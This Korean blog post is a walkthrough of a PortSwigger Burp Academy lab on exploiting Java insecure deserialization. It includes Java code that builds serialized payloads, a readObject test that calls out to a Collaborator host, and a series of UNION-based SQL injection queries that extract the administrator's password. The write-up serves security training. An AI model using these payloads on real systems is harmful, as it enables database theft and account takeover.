---
layout: post
title: "Burp Academy-안전하지 않은 역직렬화(Insecure Deserialization) 관련 취약점: Developing a custom gadget chain for Java deserialization"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, Insecure Deserialization]
toc: true
last_modified_at: 2024-07-30 21:00:00 +0900
---


# 개요
- 안전하지 않은 역직렬화(Insecure Deserialization) 취약점 문제이다. 
- 문제 주소: https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-java-deserialization
- 취약점 설명페이지: https://portswigger.net/web-security/deserialization/exploiting
- 난이도: EXPERT (어려움)


# 취약점 개요 (Creating your own exploit)
- 개짓체인을 제공해주는 툴도, 웹 문서도 없다면 자신이 직접만드는 수 밖에 없다. 
- 성공적으로 개짓체인을 만들려면 소스코드에 접근할 수 있어야 한다. 
- 소스코드 분석시에 처음으로 할 일은 역직렬화 수행시 자동으로 호출되는 매직메서드를 포함하는 클래스를 찾는 것이다.
- 이 매직 메서드가 실행하는 코드를 조사하여, 유저가 제어할 수 있는 속성(입력값)으로 위험한 작업을 수행하는지 확인한다. 



# 랩 개요 
- 이 랩은 직렬화 베이스의 세션 관리 메커니즘을 사용하고 있다. 
- 당신(도전자)는 적절한 개짓체인을 개발한 후, 이 랩의 취약한 역직렬화 기능을 exploit하여 관리자의 패스워드를 알아낼 수 있다. 
- 랩을 풀려면 소스코드에 접근하는 권한을 얻어낸 후, 그 것을 관리자의 패스워드를 알아내는 개짓체인을 만드는데 사용하라. 
- 그 후에 관리자로 로그인한 후, carlos유저를 삭제하면 된다. 
- wiener:peter 크레덴셜로 로그인할 수 있다. 

```
This lab uses a serialization-based session mechanism. If you can construct a suitable gadget chain, you can exploit this lab's insecure deserialization to obtain the administrator's password.

To solve the lab, gain access to the source code and use it to construct a gadget chain to obtain the administrator's password. Then, log in as the administrator and delete carlos.

You can log in to your own account using the following credentials: wiener:peter

Note that solving this lab requires basic familiarity with another topic that we've covered on the Web Security Academy.
```

# 도전
일단 바로 여기저기 살펴보자. 

1. 로그인해서 발급받은 세션쿠키를 URL디코딩->Base64디코딩해보면 Java언어로 만들어진 직렬화 객체인 것을 알 수 있다. 

![](/images/burp-academy-serial-8-1.png)


2. 소스코드에 접근하는 방법을 알아내야 한다. HTML 페이지 주석이나 에러메세지, 백업파일 등이 있나 찾아본다. 

3. 백업파일이 있는 것을 찾았다. `/backup/AccessTokenUser.java` 경로다. 

![](/images/burp-academy-serial-8-2.png)

4. 해당경로로 접근하면 다음과 같이 AccessTokenUser 의 코드를 확인할 수 있다. 

```java
package data.session.token;

import java.io.Serializable;

public class AccessTokenUser implements Serializable
{
    private final String username;
    private final String accessToken;

    public AccessTokenUser(String username, String accessToken)
    {
        this.username = username;
        this.accessToken = accessToken;
    }

    public String getUsername()
    {
        return username;
    }

    public String getAccessToken()
    {
        return accessToken;
    }
}
```

5. 코드를 살펴본다. Serializable 인터페이스를 구현했으므로 직렬화할 수 있는 클래스인 것을 알 수 있다. readObject 함수는 구현되어 있지 않다. (Serializable 인터페이스를 구현한 클래스는 자신의 readObject를 선언 및 구현할 수 있다.)

6. 어떻게 공격할까? 일단 바로 떠오르는 것은 AccessTokenUser 클래스에 위험한 readObject 메서드를 추가해서 컴파일한 것을 서버로 보내는 것이다. 

7. 일단 시도해본다. Burp Collaborator서버에 curl을 보내는 Java명령을 심어본다. 

다음과 같이 코딩했다. 

```java
package data.session.token;

import java.io.IOException;
import java.io.Serializable;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;

public class AccessTokenUser implements Serializable
{
    private final String username;
    private final String accessToken;

    public AccessTokenUser(String username, String accessToken)
    {
        this.username = username;
        this.accessToken = accessToken;
    }

    public String getUsername()
    {
        return username;
    }

    public String getAccessToken()
    {
        return accessToken;
    }
    
	private void readObject(java.io.ObjectInputStream stream) throws IOException, ClassNotFoundException, InterruptedException {
		stream.defaultReadObject();
//		Runtime.getRuntime().exec(this.name);
		String url = "https://2svr1jmg0fvhi8ei4e0glnvcy34uskg9.oastify.com";
		var client = HttpClient.newHttpClient(); //java 11
		var request = HttpRequest.newBuilder(URI.create(url))
				.GET()
				.build(); 
		HttpResponse<String> res = client.send(request, HttpResponse.BodyHandlers.ofString());
		System.out.println(res);
	}
}
```

다음 클래스를 사용해서 직렬화한다. 

```java
package data.session.token;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class AccessTokenDeser {

	
	public static String serializeUser(AccessTokenUser user) throws IOException {
		   ByteArrayOutputStream baos = null;
		   baos = new ByteArrayOutputStream();
		   ObjectOutputStream oos = new ObjectOutputStream(baos);
		   oos.writeObject(user);
		   oos.close();
		  
		   return Base64.getEncoder().encodeToString(baos.toByteArray());
		}
	
	public static void main(String[] args) throws IOException {
		AccessTokenUser user = new AccessTokenUser("tester", "XXXXXXXXXXXXXXXXXXXXXXXXX");
		String userSerialized = serializeUser(user);
		System.out.println(userSerialized);
	}
}

```

결과물은 다음과 같다. 이 것은 URL인코딩해서 세션토큰으로 보내본다. 

```
rO0ABXNyACJkYXRhLnNlc3Npb24udG9rZW4uQWNjZXNzVG9rZW5Vc2Vyc1+hUBRJ0u8CAAJMAAthY2Nlc3NUb2tlbnQAEkxqYXZhL2xhbmcvU3RyaW5nO0wACHVzZXJuYW1lcQB+AAF4cHQAGVhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFh0AAZ0ZXN0ZXI=
```


8. 세션토큰으로 보내자 다음과 같이 500응답과 함께 에러 메세지가 출력되었다. "java.lang.ClassNotFoundException: data.session.token.AccessTokenUser" 이 것으로 두 가지를 알 수 있다. 
- 실제 AccessTokenUser는 패키지 경로가 다르다. 백업파일 클래스에 적혀있던 것 처럼 `data.session.token` 패키지는 실제로는 존재하지 않는 것을 알 수 있다. 
- 서버가 세션토큰을 역직렬화하려고 시도했다. 

```
java.lang.ClassNotFoundException: data.session.token.AccessTokenUser
```

![](/images/burp-academy-serial-8-3.png)


9. 정규 토큰을 Base64으로 디코딩해서 다시 살펴보면 AccessTokenUser클래스의 경로가 `lab.actions.common.serializable.AccessTokenUser` 인 것을 알 수 있다! eclipse에서 AccessTokenUser의 패키지 경로를 이 경로로 수정한 다음에 다시 컴파일해서 실행한 결과를 보내보자. 

![](/images/burp-academy-serial-8-4.png)


10. 다시 보내보면 이번에는 에러가 발생하지 않고 302응답이 돌아온 것을 볼 수 있다. 역직렬화에 성공한 것이다! 하지만 Burp Collaborator 서버에서 확인된 응답은 없었다. 문제 서버가 외부로의 아웃바운드 통신은 거부하고 있는지도 모르겠다. 


![](/images/burp-academy-serial-8-5.png)

11. 음... 여기서 막혔다. 어떻게 관리자의 패스워드는 어떻게 알아낼 수 있을까? 


---
# 답을 보고 풀이
모르겠으니 답을 보면서 풀어본다. 

## 1. 백업파일이 존재하는 경로 `/backup/AccessTokenUser.java` 의 상위 디렉터리인 `/backup`에 접근하면 다음과 같이 다른 파일 `ProductTemplate.java`가 있는 것을 알 수 있다. 

![](/images/burp-academy-serial-8-6.png)


## 2. 해당 파일에 접근해본다. 다음과 같이 소스코드를 확인할 수 있다. 분석해본다. 

소스코드를 읽어보면 다음을 알아챌 수 있다. 
- Serializable 인터페이스를 구현했으므로 이 클래스는 직렬화/역직렬화의 대상이 된다. 따라서 "안전하지 않은 역직렬화" 공격을 사용할 수 있다. 
- readObject 함수 내에서 DB에 SQL문을 실행하는 작업을 하고 있다.  
- SQL 문을 사용할 때 플레이스 홀더를 사용하고 있지 않다. 즉, SQL 인젝션이 가능하다. 
- SQL의 파라메터인 `id`는 ProductTemplate 오브젝트를 생성시에 외부에서 삽입이 가능하다. 

```java
package data.productcatalog;

import common.db.JdbcConnectionBuilder;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

public class ProductTemplate implements Serializable
{
    static final long serialVersionUID = 1L;

    private final String id;
    private transient Product product;

    public ProductTemplate(String id)
    {
        this.id = id;
    }

    private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException
    {
        inputStream.defaultReadObject();

        JdbcConnectionBuilder connectionBuilder = JdbcConnectionBuilder.from(
                "org.postgresql.Driver",
                "postgresql",
                "localhost",
                5432,
                "postgres",
                "postgres",
                "password"
        ).withAutoCommit();
        try
        {
            Connection connect = connectionBuilder.connect(30);
            String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
            Statement statement = connect.createStatement();
            ResultSet resultSet = statement.executeQuery(sql);
            if (!resultSet.next())
            {
                return;
            }
            product = Product.from(resultSet);
        }
        catch (SQLException e)
        {
            throw new IOException(e);
        }
    }

    public String getId()
    {
        return id;
    }

    public Product getProduct()
    {
        return product;
    }
}
```

## 3. Eclipse를 열고 ProductTemplate클래스를 빌드 시도한다. 
일단 패키지 경로를 만들고 ProductTemplate 클래스를 그대로 복사해보면 컴파일 에러가 나는 것을 알 수 있다. 
- "common.db.JdbcConnectionBuilder" 를 임포트 할 수 없다.
- Product 클래스가 없다. 

![](/images/burp-academy-serial-8-7.png)


## 4. 컴파일 에러를 해결한다. 
컴파일 에러를 다음 방법으로 해결했다. 
- Product 클래스를 다음과 같이 만든다. 

```java
package data.productcatalog;

public class Product {

}

```

- readObject 함수를 삭제한다. 
- "import common.db.JdbcConnectionBuilder" 문을 삭제한다. 

그러면 다음과 같이 심플한 코드만 남게 된다. 여기서 의문이 생긴다. readObject 함수를 구현하지 않았는데 어떻게 공격을 할 수 있지? 아마도 추측건대, 서버측에서는 온전한 ProductTemplate 클래스가 동작하고 있기 때문에, 일부만 존재하는 아래 코드를 빌드한 클래스여도 역직렬화가 수행되는 것 같다. 또 하나 깨달음을 얻었다. 

```java
package data.productcatalog;


import java.io.Serializable;

public class ProductTemplate implements Serializable
{
    static final long serialVersionUID = 1L;

    private final String id;
    private transient Product product;

    public ProductTemplate(String id)
    {
        this.id = id;
    }

    public String getId()
    {
        return id;
    }

    public Product getProduct()
    {
        return product;
    }
}
```

## 5. SQL인젝션 테스트용 역직렬화 페이로드 생성
- 그리고 다음 클래스를 사용해서 역직렬화 페이로드를 만든다. 
- Product의 id값을 작은따옴표(', 싱글쿼테이션)으로 주었다. 이 것으로 SQL인젝션이 가능한지를 체크할 것이다. 

```java
package data.productcatalog;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class ProductTemplateDeserPayload {

	
	public static String serialize(ProductTemplate user) throws IOException {
		   ByteArrayOutputStream baos = null;
		   baos = new ByteArrayOutputStream();
		   ObjectOutputStream oos = new ObjectOutputStream(baos);
		   oos.writeObject(user);
		   oos.close();
		  
		   return Base64.getEncoder().encodeToString(baos.toByteArray());
		}
	
	public static void main(String[] args) throws IOException {
		ProductTemplate template = new ProductTemplate("'");
		String base64SerialObject = serialize(template);
		System.out.println(base64SerialObject);
	}
}

```

실행 결과는 다음과 같다. 

```
rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAASc=
```

## 6. SQL인젝션 테스트용 페이로드를 서버로 전송하고 결과를 확인한다. 

페이로드를 서버로 전송하고 결과를 확인해본다. 다음과 같이 SQL 에러가 발생한 것을 확인할 수 있다. SQL인젝션이 가능한 것을 알 수 있다! 

![](/images/burp-academy-serial-8-8.png)

## 7. SQL 인젝션의 UNION 공격이 가능할지 확인-칼럼 개수 확인하기
여기서부터는 본격적으로 데이터를 빼내는 방법으로 UNION 공격이 통할지 확인해본다. UNION 공격이 가능한지를 알기위해  먼저 원래의 쿼리(서버측에서 사용하는 쿼리)에서 몇 개의 칼럼을 필요로 하는지 알아야 한다. 왜냐하면 UNION문은 양 SQL문의 결과를 합치는 것인데, 이를 위해서는 양 SQL문의 실행 결과 칼럼 갯수가 동일해야 하기 때문이다. 

칼럼 개수는 다음과 같은 식으로 개수를 늘려가면서 확인한다. 에러가 나오다가 에러가 안나오는 SQL문이 있다면 그게 칼럼 개수가 맞는 SQL문일 확률이 높다. 

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

칼럼 개수가 맞지 않을 때는 다음과 같은 에러가 발생한다. 

```
java.io.IOException: org.postgresql.util.PSQLException: ERROR: each UNION query must have the same number of columns
  Position: 51
```

![](/images/burp-academy-serial-8-9.png)


칼럼개수가 8개일 때 다음과 같이 에러 메세지가 변화했다. 원 쿼리의 칼럼 개수는 8개인 것으로 보인다. 

```sql
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL --
```

```
java.lang.ClassCastException: Cannot cast data.productcatalog.ProductTemplate to lab.actions.common.serializable.AccessTokenUser
```

![](/images/burp-academy-serial-8-10.png)


## 8. UNION 공격이 가능할지 확인-문자열을 출력가능한 칼럼 특정하기 
8개의 칼럼 중에서 문자열을 출력가능한 칼럼이 있는지 체크한다. 빼내고 싶은 정보는 대부분 문자열이기 때문이다. 

이를 위해 다음과 같은 테크닉을 사용한다. `'a'`의 위치를 바꿔가면서 테스트해나간다. 

```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```


테스트해보면 4번째 칼럼부터 6번째 칼럼까지는 문자열을 사용할 수 없는 것을 알 수 있다.


```sql
' UNION SELECT NULL,NULL,NULL,'a',NULL,NULL,NULL,NULL --
```

4번째 칼럼부터는 에러 메세지가 다음과 같이 바뀐다. 또한 **문자열 입력값인 'a'가 에러 메세지에 나타나는 것을 알 수 있다.** 이 특성을 이용하면 정보를 빼낼 수 있다. 

```
java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type integer: &quot;a&quot;
  Position: 66
```

![](/images/burp-academy-serial-8-11.png)


## 9. 유저정보를 저장하는 테이블명을 알아내기 

계속 테스트해나간다. `information_schema.tables` 테이블에서 테이블명을 조회하는 다음 쿼리를 사용한다. 

```sql
' UNION SELECT NULL,NULL,NULL, table_name, NULL,NULL,NULL,NULL FROM information_schema.tables --
```

결과는 다음과 같다. Integer타입이 조회하려고 하는 문자열 칼럼 table_name과 매치가 안된다는 것으로 보인다. 

```
java.io.IOException: org.postgresql.util.PSQLException: ERROR: UNION types integer and name cannot be matched
  Position: 67
```


![](/images/burp-academy-serial-8-12.png)


쿼리를 다음과 같이 수정한다. 

```sql
' UNION SELECT NULL,NULL,NULL,CAST(table_name as numeric),NULL,NULL,NULL,NULL FROM information_schema.tables --
```

보내본다. 여전히 에러가 발생하지만 테이블명도 출력된 것을 알 수 있다. `users`테이블의 존재를 확인했다. 이 테이블이 유저정보를 저장하는 테이블로 보인다. 

```
java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type numeric: &quot;users&quot;
```

![](/images/burp-academy-serial-8-13.png)


## 10. users 테이블에 존재하는 칼럼명 알아내기 

쿼리를 다음과 같이 수정한다. 

```sql
' UNION SELECT NULL,NULL,NULL,CAST(column_name as numeric),NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users' --
```

이를 보내면 다음과 같은 결과가 돌아온다. 

![](/images/burp-academy-serial-8-15.png)

이를 통해 users 테이블에 username 칼럼이 있는 것을 알아냈다. 

그런데 패스워드는 어떨까? 패스워드가 저장된 칼럼도 알아낼 필요가 있다. 그러나 위의 쿼리로는 항상 username 밖에 얻어낼 수 없다... 

ORDER BY 를 사용하면 어떨까? ORDER BY 를 쓸 수 있다면 결과가 조회되는 순서를 바꿀 수 있으므로 다른 칼럼명도 보일 것 같다. 시험해보면 ORDER BY 에 지정한 칼럼명 column_name을 알 수 없다는 에러 메세지가 출력된다. 이는 UNION 으로 쿼리 결과를 묶을 시에는 원래 쿼리(UNION의 좌측 쿼리)의 칼럼명을 지정해야하기 때문으로 보인다. 여기에서는 원래 쿼리를 확인할 방법이 없기 때문에 이 방법은 사용할 수 없다. 

좀 고민하다가 이 쿼리를 생각해냈다. WHERE조건을 사용해 결과에서 username 칼럼을 빼면되지 않을까하고 생각한 것이다. 

```sql
' UNION SELECT NULL,NULL,NULL,CAST(column_name as numeric),NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users' and column_name !='username' --
```

이를 보내면 다음과 같은 결과가 돌아온다. 이를 통해 password 칼럼의 존재도 확인했다. 

![](/images/burp-academy-serial-8-14.png)

## 11. users 테이블에서 유저명 알아내기 

쿼리를 다음과 같이 수정한다. 

```sql
' UNION SELECT NULL, NULL, NULL, CAST(username AS numeric), NULL, NULL, NULL, NULL FROM users--
```

이를 보내면 다음과 같은 결과가 돌아온다. 이를 통해 유저명이 `administrator`인 것을 알아냈다. 

![](/images/burp-academy-serial-8-17.png)



## 12. users 테이블에서 administrator의 패스워드 알아내기 

쿼리를 다음과 같이 수정한다. 

```sql
' UNION SELECT NULL, NULL, NULL, CAST(password AS numeric), NULL, NULL, NULL, NULL FROM users--
```


이를 보내면 다음과 같은 결과가 돌아온다. 이를 통해 administrator의 패스워드를 알아냈다. 

![](/images/burp-academy-serial-8-16.png)


## 13. 알아낸 정보로 로그인하기 

알아낸 정보로 로그인을 시도하면 다음과 같이 로그인에 성공한다. 

![](/images/burp-academy-serial-8-18.png)

관리자 패널에 들어가 calros유저를 삭제하면 문제가 풀린다! 

![](/images/burp-academy-serial-8-success.png)


# 감상
꽤나 어려운 문제였다. 먼저 백업파일을 찾아서 소스코드를 얻어낼 필요가 있었다. 소스 코드를 분석해서 공격이 가능한 포인트를 찾아내야 했다. 또한 얻어낸 자바 소스코드를 컴파일하는 환경을 구축해야 했다. 여기서 컴파일이 안되는 부분을 해결해야 했다. 마지막에는 난이도 있는 SQL인젝션을 수행해야 했다. 